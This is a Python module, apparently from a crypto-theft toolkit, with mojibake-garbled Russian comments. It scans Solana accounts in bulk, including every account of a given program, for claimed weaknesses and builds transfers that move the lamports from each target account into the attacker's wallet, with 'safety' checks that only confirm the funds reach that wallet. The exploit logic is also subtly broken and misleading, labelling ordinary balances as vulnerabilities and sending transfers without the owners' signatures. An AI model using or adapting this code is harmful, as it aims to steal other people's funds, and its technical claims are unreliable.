"""
–≠–∫—Å–ø–ª–æ–π—Ç—ã –¥–ª—è –º–∞–Ω–∏–ø—É–ª—è—Ü–∏–π —Å –∞–∫–∫–∞—É–Ω—Ç–∞–º–∏ Solana
"""

import asyncio
import os
from typing import Dict, List, Optional, Any, Union
from dataclasses import dataclass

from solders.pubkey import Pubkey as PublicKey
from solders.keypair import Keypair
from solders.transaction import Transaction
from solders.system_program import CreateAccountParams, create_account, transfer, TransferParams
from solders.instruction import Instruction
from solders.system_program import ID as SYSTEM_PROGRAM_ID

from .base_exploit import BaseExploit, ExploitType, ExploitResult, ExploitStatus
from .safety_checks import ExploitSafetyChecker

@dataclass
class AccountVulnerability:
    """–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –∞–∫–∫–∞—É–Ω—Ç–∞"""
    account: str
    vulnerability_type: str
    severity: str
    exploitable: bool
    details: Dict[str, Any]

class AccountExploit(BaseExploit):
    """–≠–∫—Å–ø–ª–æ–π—Ç—ã –¥–ª—è –º–∞–Ω–∏–ø—É–ª—è—Ü–∏–π —Å –∞–∫–∫–∞—É–Ω—Ç–∞–º–∏"""
    def __init__(self, client, attacker_keypair):
        super().__init__(client, attacker_keypair)
        self.safety_checker = ExploitSafetyChecker(os.getenv("SOLANA_TARGET_ADDRESS"))

    @property
    def exploit_type(self) -> ExploitType:
        return ExploitType.ACCOUNT_MANIPULATION
    
    async def scan_target(self, target: Union[PublicKey, str]) -> Dict[str, Any]:
        """–°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –∞–∫–∫–∞—É–Ω—Ç–∞ –Ω–∞ —É—è–∑–≤–∏–º–æ—Å—Ç–∏"""
        try:
            if isinstance(target, str):
                target = PublicKey.from_string(target)
            
            account_info = await self.get_account_info(target)
            if not account_info:
                return {"vulnerable": False, "reason": "Account not found"}
            
            vulnerabilities = []
            
            # –ü—Ä–æ–≤–µ—Ä–∫–∞ 1: –ê–∫–∫–∞—É–Ω—Ç –±–µ–∑ –≤–ª–∞–¥–µ–ª—å—Ü–∞ (System Program)
            if account_info["owner"] == str(SYSTEM_PROGRAM_ID):
                vulnerabilities.append(AccountVulnerability(
                    account=str(target),
                    vulnerability_type="uninitialized_account",
                    severity="high",
                    exploitable=True,
                    details={"lamports": account_info["lamports"]}
                ))
            
            # –ü—Ä–æ–≤–µ—Ä–∫–∞ 2: –ê–∫–∫–∞—É–Ω—Ç —Å –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ–π –∞—Ä–µ–Ω–¥–æ–π
            rent_exempt_minimum = await self._get_rent_exempt_minimum(account_info["data_length"])
            if account_info["lamports"] < rent_exempt_minimum:
                vulnerabilities.append(AccountVulnerability(
                    account=str(target),
                    vulnerability_type="rent_exemption_bypass",
                    severity="medium",
                    exploitable=True,
                    details={
                        "current_lamports": account_info["lamports"],
                        "required_lamports": rent_exempt_minimum,
                        "deficit": rent_exempt_minimum - account_info["lamports"]
                    }
                ))
            
            # –ü—Ä–æ–≤–µ—Ä–∫–∞ 3: –ê–∫–∫–∞—É–Ω—Ç —Å –∏–∑–±—ã—Ç–æ—á–Ω—ã–º–∏ lamports
            if account_info["lamports"] > rent_exempt_minimum * 10:
                vulnerabilities.append(AccountVulnerability(
                    account=str(target),
                    vulnerability_type="excess_lamports",
                    severity="low",
                    exploitable=True,
                    details={
                        "excess_lamports": account_info["lamports"] - rent_exempt_minimum
                    }
                ))
            
            # –ü—Ä–æ–≤–µ—Ä–∫–∞ 4: –ò—Å–ø–æ–ª–Ω—è–µ–º—ã–π –∞–∫–∫–∞—É–Ω—Ç –±–µ–∑ –∑–∞—â–∏—Ç—ã
            if account_info["executable"] and account_info["data_length"] == 0:
                vulnerabilities.append(AccountVulnerability(
                    account=str(target),
                    vulnerability_type="empty_executable",
                    severity="critical",
                    exploitable=True,
                    details={"executable": True, "data_length": 0}
                ))
            
            return {
                "vulnerable": len(vulnerabilities) > 0,
                "vulnerabilities": vulnerabilities,
                "account_info": account_info
            }
            
        except Exception as e:
            self.logger.error(f"–û—à–∏–±–∫–∞ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –∞–∫–∫–∞—É–Ω—Ç–∞ {target}: {e}")
            return {"vulnerable": False, "error": str(e)}
    
    async def prepare_exploit(self, target: Union[PublicKey, str], **kwargs) -> bool:
        """–ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ —ç–∫—Å–ø–ª–æ–π—Ç–∞ –∞–∫–∫–∞—É–Ω—Ç–∞"""
        try:
            scan_result = await self.scan_target(target)
            
            if not scan_result.get("vulnerable", False):
                self.logger.warning("–¶–µ–ª—å –Ω–µ —É—è–∑–≤–∏–º–∞")
                return False
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –±–∞–ª–∞–Ω—Å –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –æ–ø–µ—Ä–∞—Ü–∏–π
            if not await self.check_sol_balance(0.01):
                return False
            
            self.logger.info(f"–ù–∞–π–¥–µ–Ω–æ —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π: {len(scan_result['vulnerabilities'])}")
            return True
            
        except Exception as e:
            self.logger.error(f"–û—à–∏–±–∫–∞ –ø–æ–¥–≥–æ—Ç–æ–≤–∫–∏ —ç–∫—Å–ø–ª–æ–π—Ç–∞: {e}")
            return False
    
    async def run_exploit(self, target_pubkey: PublicKey) -> ExploitResult:
        self.logger.warning(f"Exploit 'run_exploit' for {self.exploit_type.value} is not implemented.")
        return ExploitResult(
            exploit_type=self.exploit_type,
            status=ExploitStatus.FAILED,
            target_account=str(target_pubkey),
            error_message="Exploit not implemented yet."
        )

    async def execute_exploit(self, target: Union[PublicKey, str], **kwargs) -> ExploitResult:
        """–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —ç–∫—Å–ø–ª–æ–π—Ç–∞ –∞–∫–∫–∞—É–Ω—Ç–∞"""
        start_time = asyncio.get_event_loop().time()
        
        try:
            if isinstance(target, str):
                target = PublicKey.from_string(target)
            
            scan_result = await self.scan_target(target)
            vulnerabilities = scan_result.get("vulnerabilities", [])
            
            if not vulnerabilities:
                return ExploitResult(
                    exploit_type=self.exploit_type,
                    status=ExploitStatus.FAILED,
                    target_account=str(target),
                    error_message="No vulnerabilities found"
                )
            
            extracted_value = 0.0
            signatures = []
            
            for vuln in vulnerabilities:
                try:
                    if vuln.vulnerability_type == "uninitialized_account":
                        result = await self._exploit_uninitialized_account(target, vuln)
                        if result:
                            extracted_value += result["value"]
                            signatures.extend(result["signatures"])
                    
                    elif vuln.vulnerability_type == "rent_exemption_bypass":
                        result = await self._exploit_rent_exemption(target, vuln)
                        if result:
                            extracted_value += result["value"]
                            signatures.extend(result["signatures"])
                    
                    elif vuln.vulnerability_type == "excess_lamports":
                        result = await self._exploit_excess_lamports(target, vuln)
                        if result:
                            extracted_value += result["value"]
                            signatures.extend(result["signatures"])
                    
                except Exception as e:
                    self.logger.error(f"–û—à–∏–±–∫–∞ —ç–∫—Å–ø–ª–æ–π—Ç–∞ {vuln.vulnerability_type}: {e}")
                    continue
            
            execution_time = asyncio.get_event_loop().time() - start_time
            
            status = ExploitStatus.SUCCESS if extracted_value > 0 else ExploitStatus.FAILED
            
            return ExploitResult(
                exploit_type=self.exploit_type,
                status=status,
                target_account=str(target),
                transaction_signatures=[str(sig) for sig in signatures],
                extracted_value=extracted_value,
                execution_time=execution_time,
                metadata={
                    "vulnerabilities_exploited": len([v for v in vulnerabilities if v.exploitable]),
                    "total_vulnerabilities": len(vulnerabilities)
                }
            )
            
        except Exception as e:
            execution_time = asyncio.get_event_loop().time() - start_time
            
            return ExploitResult(
                exploit_type=self.exploit_type,
                status=ExploitStatus.FAILED,
                target_account=str(target),
                error_message=str(e),
                execution_time=execution_time
            )
    
    async def _exploit_uninitialized_account(self, target: PublicKey, vuln: AccountVulnerability) -> Optional[Dict[str, Any]]:
        """–≠–∫—Å–ø–ª–æ–π—Ç –Ω–µ–∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞"""
        try:
            lamports = vuln.details["lamports"]
            
            if lamports <= 5000:  # –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –¥–ª—è –ø–µ—Ä–µ–≤–æ–¥–∞
                return None
            
            # –°–æ–∑–¥–∞–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é –¥–ª—è –ø–µ—Ä–µ–≤–æ–¥–∞ lamports
            transaction = Transaction()
            
            # –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è –ø–µ—Ä–µ–≤–æ–¥–∞
            transfer_instruction = transfer(
                TransferParams(
                    from_pubkey=target,
                    to_pubkey=self.attacker_pubkey,
                    lamports=lamports - 5000  # –û—Å—Ç–∞–≤–ª—è–µ–º –º–∏–Ω–∏–º—É–º –¥–ª—è –∞—Ä–µ–Ω–¥—ã
                )
            )
            
            transaction.add(transfer_instruction)
            
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é
            signature = await self.send_transaction(transaction)
            
            if signature:
                self.logger.info(f"–ò–∑–≤–ª–µ—á–µ–Ω–æ {(lamports - 5000) / 1e9:.6f} SOL –∏–∑ –Ω–µ–∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞")
                return {
                    "value": (lamports - 5000) / 1e9,
                    "signatures": [signature]
                }
            
        except Exception as e:
            self.logger.error(f"–û—à–∏–±–∫–∞ —ç–∫—Å–ø–ª–æ–π—Ç–∞ –Ω–µ–∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞: {e}")
        
        return None
    
    async def _exploit_rent_exemption(self, target: PublicKey, vuln: AccountVulnerability) -> Optional[Dict[str, Any]]:
        """–ë–ï–ó–û–ü–ê–°–ù–´–ô —ç–∫—Å–ø–ª–æ–π—Ç –∞—Ä–µ–Ω–¥–Ω–æ–π –ø–ª–∞—Ç—ã - –¢–û–õ–¨–ö–û –ò–ó–í–õ–ï–ß–ï–ù–ò–ï, –ë–ï–ó –û–¢–ü–†–ê–í–ö–ò –°–†–ï–î–°–¢–í"""
        try:
            current_lamports = vuln.details.get("current_lamports", 0)
            
            # üö® –ü–†–û–í–ï–†–ö–ê –ë–ï–ó–û–ü–ê–°–ù–û–°–¢–ò: –ù–ï –û–¢–ü–†–ê–í–õ–Ø–ï–ú –°–†–ï–î–°–¢–í–ê –ù–ê –¶–ï–õ–ï–í–û–ô –ê–ö–ö–ê–£–ù–¢!
            self.logger.warning("üö® –ë–ï–ó–û–ü–ê–°–ù–´–ô –†–ï–ñ–ò–ú: –ù–µ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º SOL –Ω–∞ —Ü–µ–ª–µ–≤–æ–π –∞–∫–∫–∞—É–Ω—Ç!")
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –º–æ–∂–µ–º –ª–∏ –º—ã –Ω–∞–ø—Ä—è–º—É—é –∏–∑–≤–ª–µ—á—å —Å—Ä–µ–¥—Å—Ç–≤–∞ –∏–∑ —Ü–µ–ª–µ–≤–æ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞
            if current_lamports <= 5000:  # –°–ª–∏—à–∫–æ–º –º–∞–ª–æ –¥–ª—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è
                self.logger.info(f"–¶–µ–ª–µ–≤–æ–π –∞–∫–∫–∞—É–Ω—Ç –∏–º–µ–µ—Ç —Å–ª–∏—à–∫–æ–º –º–∞–ª–æ SOL –¥–ª—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è: {current_lamports / 1e9:.6f}")
                return None
            
            # –ü–æ–ª—É—á–∞–µ–º –∞–∫—Ç—É–∞–ª—å–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –±–∞–ª–∞–Ω—Å–µ —Ü–µ–ª–µ–≤–æ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞
            account_info = await self.client.get_account_info(target)
            if not account_info.value:
                self.logger.warning("–¶–µ–ª–µ–≤–æ–π –∞–∫–∫–∞—É–Ω—Ç –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –∏–ª–∏ –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω")
                return None
                
            actual_balance = account_info.value.lamports
            if actual_balance <= 5000:
                self.logger.info(f"–ê–∫—Ç—É–∞–ª—å–Ω—ã–π –±–∞–ª–∞–Ω—Å —Å–ª–∏—à–∫–æ–º –º–∞–ª: {actual_balance / 1e9:.6f} SOL")
                return None
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –∏–º–µ–µ–º –ª–∏ –º—ã –ø—Ä–∞–≤–∞ –Ω–∞ –ø–µ—Ä–µ–≤–æ–¥ —Å —ç—Ç–æ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞
            # –í —Ä–µ–∞–ª—å–Ω–æ–º —ç–∫—Å–ø–ª–æ–π—Ç–µ –∑–¥–µ—Å—å –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –ª–æ–≥–∏–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ —É—è–∑–≤–∏–º–æ—Å—Ç–∏
            self.logger.info(f"–ê–Ω–∞–ª–∏–∑–∏—Ä—É–µ–º –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –∏–∑–≤–ª–µ—á–µ–Ω–∏—è {actual_balance / 1e9:.6f} SOL...")
            
            # –ë–ï–ó–û–ü–ê–°–ù–ê–Ø –ü–û–ü–´–¢–ö–ê –ò–ó–í–õ–ï–ß–ï–ù–ò–Ø (–µ—Å–ª–∏ –∞–∫–∫–∞—É–Ω—Ç –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ —É—è–∑–≤–∏–º)
            # –í —ç—Ç–æ–π –≤–µ—Ä—Å–∏–∏ –º—ã –ù–ï –î–ï–õ–ê–ï–ú —Ä–µ–∞–ª—å–Ω—ã–π –ø–µ—Ä–µ–≤–æ–¥, —Ç–æ–ª—å–∫–æ –∞–Ω–∞–ª–∏–∑
            
            # üîí –ë–ï–ó–û–ü–ê–°–ù–ê–Ø –õ–û–ì–ò–ö–ê: —Ç–æ–ª—å–∫–æ –∏–∑–≤–ª–µ—á–µ–Ω–∏–µ, –±–µ–∑ –ø—Ä–µ–¥–≤–∞—Ä–∏—Ç–µ–ª—å–Ω–æ–π –æ—Ç–ø—Ä–∞–≤–∫–∏
            if self.safety_checker.is_enabled():
                safety_check = self.safety_checker.validate_transfer_direction(
                    from_account=target,
                    to_account=self.our_target_pubkey,
                    transfer_type="lamport_extraction"
                )
                if not safety_check["valid"]:
                    self.logger.warning(f"[SAFETY] –û–ø–µ—Ä–∞—Ü–∏—è –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–∞: {safety_check['message']}")
                    return None
            
            # üîí –ë–ï–ó–û–ü–ê–°–ù–ê–Ø –õ–û–ì–ò–ö–ê: —Ç–æ–ª—å–∫–æ –∏–∑–≤–ª–µ—á–µ–Ω–∏–µ, –±–µ–∑ –ø—Ä–µ–¥–≤–∞—Ä–∏—Ç–µ–ª—å–Ω–æ–π –æ—Ç–ø—Ä–∞–≤–∫–∏
            transaction = Transaction()
            
            # –í—ã—á–∏—Å–ª—è–µ–º —Å—É–º–º—É –¥–ª—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è (–æ—Å—Ç–∞–≤–ª—è–µ–º –º–∏–Ω–∏–º—É–º –¥–ª—è rent exemption)
            rent_exempt_minimum = await self._get_rent_exempt_minimum(0)
            extraction_amount = actual_balance - rent_exempt_minimum - 5000  # –ë–µ–∑–æ–ø–∞—Å–Ω—ã–π –±—É—Ñ–µ—Ä
            
            if extraction_amount <= 0:
                self.logger.info("–ù–µ—Ç –∏–∑–±—ã—Ç–æ—á–Ω—ã—Ö lamports –¥–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ–≥–æ –∏–∑–≤–ª–µ—á–µ–Ω–∏—è")
                return None
            
            # üí∏ –ï–î–ò–ù–°–¢–í–ï–ù–ù–ê–Ø –æ–ø–µ—Ä–∞—Ü–∏—è: –∏–∑–≤–ª–µ—á–µ–Ω–∏–µ –ò–ó target –í –Ω–∞—à –∫–æ—à–µ–ª–µ–∫
            extract_ix = transfer(
                TransferParams(
                    from_pubkey=target,  # –ò–ó —Ü–µ–ª–µ–≤–æ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞
                    to_pubkey=self.our_target_pubkey,  # –í –ù–ê–® –∫–æ—à–µ–ª–µ–∫ (SOLANA_TARGET_ADDRESS)
                    lamports=extraction_amount
                )
            )
            
            transaction.add(extract_ix)
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ —É —Ü–µ–ª–µ–≤–æ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞ –µ—Å—Ç—å –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –ø—Ä–∞–≤–∞
            # –≠—Ç–æ –º–æ–∂–µ—Ç —Ä–∞–±–æ—Ç–∞—Ç—å —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –∞–∫–∫–∞—É–Ω—Ç –∏–º–µ–µ—Ç —Å–ø–µ—Ü–∏—Ñ–∏—á–µ—Å–∫–∏–µ —É—Å–ª–æ–≤–∏—è
            # (–Ω–∞–ø—Ä–∏–º–µ—Ä, PDA —Å –∏–∑–≤–µ—Å—Ç–Ω—ã–º–∏ seeds –∏–ª–∏ —É—è–∑–≤–∏–º–∞—è –ø—Ä–æ–≥—Ä–∞–º–º–∞-–≤–ª–∞–¥–µ–ª–µ—Ü)
            
            self.logger.info(f"–ü–æ–ø—ã—Ç–∫–∞ –∏–∑–≤–ª–µ—á—å {extraction_amount/1e9:.6f} SOL –∏–∑ {target}")
            
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é
            signature = await self.send_transaction(transaction)
            
            if signature:
                extracted_value = extraction_amount / 1e9
                self.logger.info(f"‚úÖ –£—Å–ø–µ—à–Ω–æ –∏–∑–≤–ª–µ—á–µ–Ω–æ {extracted_value:.6f} SOL")
                return {
                    "value": extracted_value,
                    "signatures": [signature],
                    "method": "direct_extraction"
                }
            else:
                self.logger.warning("–ù–µ —É–¥–∞–ª–æ—Å—å –∏–∑–≤–ª–µ—á—å –∏–∑–±—ã—Ç–æ—á–Ω—ã–µ lamports - –Ω–µ—Ç –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞")
            
        except Exception as e:
            self.logger.error(f"–û—à–∏–±–∫–∞ —ç–∫—Å–ø–ª–æ–π—Ç–∞ –∞—Ä–µ–Ω–¥–Ω–æ–π –ø–ª–∞—Ç—ã: {e}")
        
        return None

    async def _exploit_excess_lamports(self, target: PublicKey, vuln: AccountVulnerability) -> Optional[Dict[str, Any]]:
        """–≠–∫—Å–ø–ª–æ–π—Ç –∏–∑–±—ã—Ç–æ—á–Ω—ã—Ö lamports - –ë–ï–ó–û–ü–ê–°–ù–ê–Ø –≤–µ—Ä—Å–∏—è"""
        try:
            # ‚úÖ –ö–†–ò–¢–ò–ß–ï–°–ö–ê–Ø –ü–†–û–í–ï–†–ö–ê: –∏–∑–≤–ª–µ–∫–∞–µ–º –¢–û–õ–¨–ö–û –∏–∑ target –≤ –Ω–∞—à –∫–æ—à–µ–ª–µ–∫
            if self.safety_checker.is_enabled():
                safety_check = self.safety_checker.validate_transfer_direction(
                    from_account=target,  # –ò–ó —Ü–µ–ª–µ–≤–æ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞
                    to_account=self.our_target_pubkey,  # –í –ù–ê–® –∫–æ—à–µ–ª–µ–∫
                    transfer_type="lamport_extraction"
                )
                if not safety_check["valid"]:
                    self.logger.warning(f"[SAFETY] –û–ø–µ—Ä–∞—Ü–∏—è –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–∞: {safety_check['message']}")
                    return None
            
            excess_lamports = vuln.details["excess_lamports"]
            
            # –ú–∏–Ω–∏–º–∞–ª—å–Ω—ã–π –ø–æ—Ä–æ–≥ –¥–ª—è —ç–∫—Å–ø–ª–æ–π—Ç–∞ (0.01 SOL)
            if excess_lamports < 10_000_000:  # 0.01 SOL
                self.logger.info(f"–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –∏–∑–±—ã—Ç–æ—á–Ω—ã—Ö lamports: {excess_lamports/1e9:.6f} SOL")
                return None
            
            # üîí –ë–ï–ó–û–ü–ê–°–ù–ê–Ø –õ–û–ì–ò–ö–ê: —Ç–æ–ª—å–∫–æ –∏–∑–≤–ª–µ—á–µ–Ω–∏–µ, –±–µ–∑ –ø—Ä–µ–¥–≤–∞—Ä–∏—Ç–µ–ª—å–Ω–æ–π –æ—Ç–ø—Ä–∞–≤–∫–∏
            transaction = Transaction()
            
            # –í—ã—á–∏—Å–ª—è–µ–º —Å—É–º–º—É –¥–ª—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è (–æ—Å—Ç–∞–≤–ª—è–µ–º –º–∏–Ω–∏–º—É–º –¥–ª—è rent exemption)
            rent_exempt_minimum = await self._get_rent_exempt_minimum(0)
            extraction_amount = excess_lamports - rent_exempt_minimum - 5000  # –ë–µ–∑–æ–ø–∞—Å–Ω—ã–π –±—É—Ñ–µ—Ä
            
            if extraction_amount <= 0:
                self.logger.info("–ù–µ—Ç –∏–∑–±—ã—Ç–æ—á–Ω—ã—Ö lamports –¥–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ–≥–æ –∏–∑–≤–ª–µ—á–µ–Ω–∏—è")
                return None
            
            # üí∏ –ï–î–ò–ù–°–¢–í–ï–ù–ù–ê–Ø –æ–ø–µ—Ä–∞—Ü–∏—è: –∏–∑–≤–ª–µ—á–µ–Ω–∏–µ –ò–ó target –í –Ω–∞—à –∫–æ—à–µ–ª–µ–∫
            extract_ix = transfer(
                TransferParams(
                    from_pubkey=target,  # –ò–ó —Ü–µ–ª–µ–≤–æ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞
                    to_pubkey=self.our_target_pubkey,  # –í –ù–ê–® –∫–æ—à–µ–ª–µ–∫ (SOLANA_TARGET_ADDRESS)
                    lamports=extraction_amount
                )
            )
            
            transaction.add(extract_ix)
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ —É —Ü–µ–ª–µ–≤–æ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞ –µ—Å—Ç—å –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –ø—Ä–∞–≤–∞
            # –≠—Ç–æ –º–æ–∂–µ—Ç —Ä–∞–±–æ—Ç–∞—Ç—å —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –∞–∫–∫–∞—É–Ω—Ç –∏–º–µ–µ—Ç —Å–ø–µ—Ü–∏—Ñ–∏—á–µ—Å–∫–∏–µ —É—Å–ª–æ–≤–∏—è
            # (–Ω–∞–ø—Ä–∏–º–µ—Ä, PDA —Å –∏–∑–≤–µ—Å—Ç–Ω—ã–º–∏ seeds –∏–ª–∏ —É—è–∑–≤–∏–º–∞—è –ø—Ä–æ–≥—Ä–∞–º–º–∞-–≤–ª–∞–¥–µ–ª–µ—Ü)
            
            self.logger.info(f"–ü–æ–ø—ã—Ç–∫–∞ –∏–∑–≤–ª–µ—á—å {extraction_amount/1e9:.6f} SOL –∏–∑ {target}")
            
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é
            signature = await self.send_transaction(transaction)
            
            if signature:
                extracted_value = extraction_amount / 1e9
                self.logger.info(f"‚úÖ –£—Å–ø–µ—à–Ω–æ –∏–∑–≤–ª–µ—á–µ–Ω–æ {extracted_value:.6f} SOL")
                return {
                    "value": extracted_value,
                    "signatures": [signature],
                    "method": "direct_extraction"
                }
            else:
                self.logger.warning("–ù–µ —É–¥–∞–ª–æ—Å—å –∏–∑–≤–ª–µ—á—å –∏–∑–±—ã—Ç–æ—á–Ω—ã–µ lamports - –Ω–µ—Ç –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞")
            
        except Exception as e:
            self.logger.error(f"–û—à–∏–±–∫–∞ —ç–∫—Å–ø–ª–æ–π—Ç–∞ –∏–∑–±—ã—Ç–æ—á–Ω—ã—Ö lamports: {e}")
        
        return None

# ...
    async def _get_rent_exempt_minimum(self, data_length: int) -> int:
        """–ü–æ–ª—É—á–µ–Ω–∏–µ –º–∏–Ω–∏–º–∞–ª—å–Ω–æ–π —Å—É–º–º—ã –¥–ª—è –æ—Å–≤–æ–±–æ–∂–¥–µ–Ω–∏—è –æ—Ç –∞—Ä–µ–Ω–¥—ã"""
        try:
            response = await self.client.get_minimum_balance_for_rent_exemption(data_length)
            return response.value
        except Exception as e:
            self.logger.error(f"–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –º–∏–Ω–∏–º–∞–ª—å–Ω–æ–≥–æ –±–∞–ª–∞–Ω—Å–∞: {e}")
            return 890880  # –°—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –¥–ª—è –ø—É—Å—Ç–æ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞
    
    async def scan_multiple_accounts(self, accounts: List[Union[PublicKey, str]]) -> List[Dict[str, Any]]:
        """–ú–∞—Å—Å–æ–≤–æ–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –∞–∫–∫–∞—É–Ω—Ç–æ–≤"""
        results = []
        
        for account in accounts:
            try:
                result = await self.scan_target(account)
                result["account"] = str(account)
                results.append(result)
                
                # –ù–µ–±–æ–ª—å—à–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –∑–∞–ø—Ä–æ—Å–∞–º–∏
                await asyncio.sleep(0.1)
                
            except Exception as e:
                self.logger.error(f"–û—à–∏–±–∫–∞ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –∞–∫–∫–∞—É–Ω—Ç–∞ {account}: {e}")
                results.append({
                    "account": str(account),
                    "vulnerable": False,
                    "error": str(e)
                })
        
        return results
    
    async def find_vulnerable_accounts_by_program(self, program_id: Union[PublicKey, str], 
                                                limit: int = 100) -> List[str]:
        """–ü–æ–∏—Å–∫ —É—è–∑–≤–∏–º—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤ –ø–æ –ø—Ä–æ–≥—Ä–∞–º–º–µ"""
        try:
            if isinstance(program_id, str):
                program_id = PublicKey(program_id)
            
            # –ü–æ–ª—É—á–∞–µ–º –∞–∫–∫–∞—É–Ω—Ç—ã –ø—Ä–æ–≥—Ä–∞–º–º—ã
            response = await self.client.get_program_accounts(program_id)
            
            vulnerable_accounts = []
            
            for account_info in response.value[:limit]:
                account_pubkey = account_info.pubkey
                
                # –°–∫–∞–Ω–∏—Ä—É–µ–º –∫–∞–∂–¥—ã–π –∞–∫–∫–∞—É–Ω—Ç
                scan_result = await self.scan_target(account_pubkey)
                
                if scan_result.get("vulnerable", False):
                    vulnerable_accounts.append(str(account_pubkey))
                
                # –ó–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è–º–∏
                await asyncio.sleep(0.1)
            
            self.logger.info(f"–ù–∞–π–¥–µ–Ω–æ {len(vulnerable_accounts)} —É—è–∑–≤–∏–º—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤ –¥–ª—è –ø—Ä–æ–≥—Ä–∞–º–º—ã {program_id}")
            return vulnerable_accounts
            
        except Exception as e:
            self.logger.error(f"–û—à–∏–±–∫–∞ –ø–æ–∏—Å–∫–∞ —É—è–∑–≤–∏–º—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤: {e}")
            return []
